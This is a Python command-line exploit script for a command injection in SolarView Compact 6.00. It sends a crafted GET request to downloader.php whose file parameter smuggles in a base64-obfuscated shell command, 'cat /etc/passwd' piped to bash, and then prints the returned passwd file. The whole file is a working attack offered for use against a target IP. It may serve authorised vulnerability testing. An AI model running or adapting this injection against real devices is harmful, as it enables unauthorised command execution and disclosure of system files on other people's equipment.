import argparse
import http.client
import base64

class SolarViewCompactExploit:
    def __init__(self, target_ip, target_port):
        self.t_ip = target_ip
        self.t_port = target_port

    def _generate_payload(self):
        cmd = "echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash"
        return f"/downloader.php?file=;{cmd}%00.zip"

    def _send_request(self, path):
        conn = http.client.HTTPConnection(self.t_ip, self.t_port)
        conn.request("GET", path)
        response = conn.getresponse()
        return response

    def run_check(self):
        path = self._generate_payload()
        response = self._send_request(path)
        if response.status == 200:
            content = response.read().decode('utf-8')
            if "root" in content:
                print("Vulnerability detected: Command Injection possible.")
                print(f"passwd file content:\n{content}")
            else:
                print("No vulnerability detected.")
        else:
            print("Error: Unable to fetch response.")

def main():
    parser = argparse.ArgumentParser(description="SolarView Compact 6.00 Command Injection Exploit")
    parser.add_argument("-i", "--ip", help="IP address of the target device", required=True)
    parser.add_argument("-p", "--port", help="Port of the target device (default: 80)", default=80, type=int)
    args = parser.parse_args()

    exploit = SolarViewCompactExploit(args.ip, args.port)
    exploit.run_check()

if __name__ == "__main__":
    main()
